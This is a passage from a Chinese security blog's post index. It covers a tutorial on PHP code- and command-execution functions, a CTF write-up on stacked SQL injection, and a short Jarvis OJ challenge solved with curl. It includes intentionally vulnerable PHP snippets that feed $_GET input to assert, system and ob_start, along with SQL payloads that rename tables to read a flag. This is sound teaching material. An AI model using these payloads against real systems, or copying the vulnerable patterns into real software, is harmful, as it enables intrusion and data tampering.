title="call_user_func()"></a>call_user_func()</h2><p>mixed call_user_func ( callable $callback [, mixed $parameter [, mixed $… ]] )<br>第一个参数 callback 是被调用的回调函数，其余参数是回调函数的参数。 传入call_user_func()的参数不能为引用传递。<br>(<code>)&lt;?php    call_user_func($_GET[&#39;chybeta&#39;],$_GET[&#39;ph0en1x&#39;]);?&gt;(</code>)</p><p>访问：</p><blockquote><p><a href="http://localhost:2500/codeexec.php?chybeta=assert&amp;ph0en1x=phpinfo()" target="_blank" rel="noopener">http://localhost:2500/codeexec.php?chybeta=assert&amp;ph0en1x=phpinfo()</a></p></blockquote><h2 id="call-user-func-array"><a href="#call-user-func-array" class="headerlink" title="call_user_func_array()"></a>call_user_func_array()</h2><p>mixed call_user_func_array ( callable $callback , array $param_arr )<br>把第一个参数作为回调函数（callback）调用，把参数数组作（param_arr）为回调函数的的参数传入。<br>(<code>)&lt;?php    call_user_func_array($_GET[&#39;chybeta&#39;],$_GET[&#39;ph0en1x&#39;]);?&gt;(</code>)</p><p>访问：</p><blockquote><p><a href="http://localhost:2500/codeexec.php?chybeta=assert&amp;ph0en1x[]=phpinfo()" target="_blank" rel="noopener">http://localhost:2500/codeexec.php?chybeta=assert&amp;ph0en1x[]=phpinfo()</a></p></blockquote><h2 id="create-function"><a href="#create-function" class="headerlink" title="create_function"></a>create_function</h2><p>string create_function ( string $args , string $code )<br>该函数的内部实现用到了eval，所以也具有相同的安全问题。第一个参数args是后面定义函数的参数，第二个参数是函数的代码。<br>(<code>)&lt;?php    $a = $_GET[&#39;chybeta&#39;];    $b = create_function(&#39;$a&#39;,&quot;echo $a&quot;);    $b(&#39;&#39;);?&gt;(</code>)</p><p>访问：</p><blockquote><p><a href="http://localhost:2500/codeexec.php" target="_blank" rel="noopener">http://localhost:2500/codeexec.php</a><br>?chybeta=phpinfo();</p></blockquote><p>##array_map()<br>array array_map ( callable $callback , array $array1 [, array $… ] )<br>作用是为数组的每个元素应用回调函数 。其返回值为数组，是为 array1 每个元素应用 callback函数之后的数组。 callback 函数形参的数量和传给 array_map() 数组数量，两者必须一样。<br>(<code>)&lt;?php    $array = array(0,1,2,3,4,5);    array_map($_GET[&#39;chybeta&#39;],$array);?&gt;(</code>)<br>访问：</p><blockquote><p><a href="http://localhost:2500/codeexec.php" target="_blank" rel="noopener">http://localhost:2500/codeexec.php</a><br>?chybeta=phpinfo</p></blockquote><p>注意没有括号()和分号;。</p><h1 id="系统命令执行相关"><a href="#系统命令执行相关" class="headerlink" title="系统命令执行相关"></a>系统命令执行相关</h1><h2 id="system"><a href="#system" class="headerlink" title="system()"></a>system()</h2><p>string system ( string $command [, int &amp;$return_var ] )<br>command是要执行的命令。return_var，如果提供 return_var 参数， 则外部命令执行后的返回状态将会被设置到此变量中。<br>(<code>)&lt;?php    system(&quot;whoami&quot;);?&gt;(</code>)<br>会看到运行了shell命令，并打印回显到页面上。</p><h2 id="passthru"><a href="#passthru" class="headerlink" title="passthru()"></a>passthru()</h2><p>void passthru ( string $command [, int &amp;$return_var ] )<br>command是要执行的命令。return_var，如果提供 return_var 参数， Unix 命令的返回状态会被记录到此参数。<br>(<code>)&lt;?php    passthru(&quot;whoami&quot;);?&gt;(</code>)</p><h2 id="exec"><a href="#exec" class="headerlink" title="exec()"></a>exec()</h2><p>string exec ( string $command [, array &amp;$output [, int &amp;$return_var ]] )<br>exec() 执行 command 参数所指定的命令。 其余参数，见文档<br>(<code>)&lt;?php    echo exec(&quot;whoami&quot;);?&gt;(</code>)</p><h2 id="pcntl-exec"><a href="#pcntl-exec" class="headerlink" title="pcntl_exec()"></a>pcntl_exec()</h2><p>void pcntl_exec ( string $path [, array $args [, array $envs ]] )<br>path是可执行二进制文件路径或一个在文件第一行指定了 一个可执行文件路径标头的脚本<br>args是一个要传递给程序的参数的字符串数组。<br>(<code>)&lt;?php    pcntl_exec ( &quot;/bin/bash&quot; , array(&quot;whoami&quot;));?&gt;(</code>)</p><h2 id="shell-exec"><a href="#shell-exec" class="headerlink" title="shell_exec()"></a>shell_exec()</h2><p>string shell_exec ( string $cmd )<br>cmd是要执行的命令。<br>(<code>)&lt;?php    echo shell_exec(&quot;whoami&quot;);?&gt;(</code>)</p><h2 id="popen"><a href="#popen" class="headerlink" title="popen()"></a>popen()</h2><p>resource popen ( string $command , string $mode )<br>打开一个指向进程的管道，该进程由派生给定的 command 命令执行而产生。 后面的mode，当为 ‘r’，返回的文件指针等于命令的 STDOUT，当为 ‘w’，返回的文件指针等于命令的 STDIN。<br>(<code>)&lt;?php$handle = popen(&quot;/bin/ls&quot;, &quot;r&quot;);?&gt;(</code>)</p><h2 id="proc-open"><a href="#proc-open" class="headerlink" title="proc_open()"></a>proc_open()</h2><p>resource proc_open ( string $cmd , array $descriptorspec , array &amp;$pipes [, string $cwd [, array $env [, array $other_options ]]] )<br>cmd是要执行的命令，其余见文档</p><p><code>(反单引号)在php中称之为执行运算符，PHP 将尝试将反引号中的内容作为 shell 命令来执行，并将其输出信息返回（即，可以赋给一个变量而不是简单地丢弃到标准输出，使用反引号运算符“</code>”的效果与函数 shell_exec() 相同。<br>(<code>)&lt;?php    echo `whoami`;?&gt;(</code>)<br>##ob_start()<br>bool ob_start ([ callback $output_callback [, int $chunk_size [, bool $erase ]]] )<br>此函数将打开输出缓冲。当输出缓冲激活后，脚本将不会输出内容（除http标头外），相反需要输出的内容被存储在内部缓冲区中。想要输出存储在内部缓冲区中的内容，可以使用 ob_end_flush() 函数。</p><p>可选参数 output_callback 函数可以被指定。 此函数把一个字符串当作参数并返回一个字符串。 当输出缓冲区被( ob_flush(), ob_clean() 或者相似的函数)冲刷（送出）或者被清洗的时候；或者在请求结束之际输出缓冲区内容被冲刷到浏览器的时候该函数将会被调用。 当调用 output_callback 时，它将收到输出缓冲区的内容作为参数 并预期返回一个新的输出缓冲区作为结果，这个新返回的输出缓冲区内容将被送到浏览器。</p><p>下面的代码，由于调用了ob_end_flush()，所以会调用ob_start(cmd)中的cmd，把我们输入的_GET[a]作为cmd的参数。<br>(<code>)&lt;?php    $cmd = &#39;system&#39;;    ob_start($cmd);    echo &quot;$_GET[a]&quot;;    ob_end_flush();?&gt;(</code>)<br>访问：</p><blockquote><p><a href="http://localhost:2500/codeexec.php?a=whoami" target="_blank" rel="noopener">http://localhost:2500/codeexec.php?a=whoami</a></p></blockquote><h2 id="php-mail"><a href="#php-mail" class="headerlink" title="php mail()"></a>php mail()</h2><p>mail 文档<br>(<code>)bool mail (    string $to ,    string $subject ,    string $message [,    string $additional_headers [,    string $additional_parameters ]])(</code>)<br>要使用mail()函数，需要配置对应的服务器等，在php.ini中有两个选项：</p><p>配置SMTP服务器的主机名和端口<br>配置PHP用作邮件传输代理（MTA）的文件路径<br>当PHP配置了第二个选项时，对该mail()函数的调用将导致执行配置对MTA程序。虽然PHP内部使用escapeshellcmd()用于程序调用，防止新的shell命令注入，但第5个参数$additional_parameters中mail()允许添加的新程序。因此，攻击者可以附加程序标志，在某些MTA中可以创建具有用户控制内容的文件</p>]]></content>
    
    
    <categories>
      
      <category>WEB</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WEB</tag>
      
      <tag>PHP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>堆叠注入</title>
    <link href="/2019/12/21/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/"/>
    <url>/2019/12/21/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<p>##堆叠注入</p><p>预编译绕过<br>预编译相关语法如下：</p><a id="more"></a><p>set用于设置变量名和值<br>prepare用于预备一个语句，并赋予名称，以后可以引用该语句<br>execute执行语句<br>deallocate prepare用来释放掉预处理的语句</p><p>直接看payload就懂了：</p><p>-1’;set @sql = CONCAT(‘se’,’lect * from <code>1919810931114514</code>;’);prepare stmt from @sql;EXECUTE stmt;#</p><p>拆分开来如下<br>-1’;<br>set @sql = CONCAT(‘se’,’lect * from <code>1919810931114514</code>;’);<br>prepare stmt from @sql;<br>EXECUTE stmt;</p><p>我们将表1919810931114514名字改为words，flag列名字改为id，那么就能得到flag的内容了。</p><p>修改表名和列名的语法如下：</p><p>修改表名(将表名user改为users)<br>alter table user rename to users;</p><p>修改列名(将字段名username改为name)<br>alter table users change uesrname name varchar(30);</p><p>最终payload如下：</p><p>1’; alter table words rename to words1;alter table <code>1919810931114514</code> rename to words;alter table words change flag id varchar(50);#</p><p>拆分开来如下<br>1’;<br>alter table words rename to words1;<br>alter table <code>1919810931114514</code> rename to words;<br>alter table words change flag id varchar(50);</p>]]></content>
    
    
    <categories>
      
      <category>SQL注入</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WEB</tag>
      
      <tag>SQL注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Jarvis OJ port 51</title>
    <link href="/2019/12/21/Jarvis-OJ-port-51/"/>
    <url>/2019/12/21/Jarvis-OJ-port-51/</url>
    
    <content type="html"><![CDATA[<p>题目链接: <a href="http://web.jarvisoj.com:32770/" target="_blank" rel="noopener">http://web.jarvisoj.com:32770/</a><br>访问页面之后，页面显示：</p><p>Please use port 51 to visit this site.</p><p>当时看到了这个还以为是需要访问这个网站的51端口，但是这个网址已经确定了是访问32770端口，后来一直都没有思路。最后才发现是要求本地以51端口去访问这个网址。payload如下：</p><a id="more"></a><blockquote><p>curl –local-port 51 <a href="http://web.jarvisoj.com:32770/" target="_blank" rel="noopener">http://web.jarvisoj.com:32770/</a></p></blockquote><p>最后就可以拿到flag</p><hr><p>curl，全称CommandLine URL 或 CommandLine Uniform Resource Locator，顾名思义，curl命令是在命令行方式下工作，利用URL的语法进行数据的传输或者文件的传输。</p><p><strong>CURL具体用法</strong><br>(<a href="https://itbilu.com/linux/man/4yZ9qH_7X.html" target="_blank" rel="noopener">https://itbilu.com/linux/man/4yZ9qH_7X.html</a>)</p>]]></content>
    
    
    <categories>
      
      <category>WEB</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WEB</tag>
      
      <tag>Jarvis OJ</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
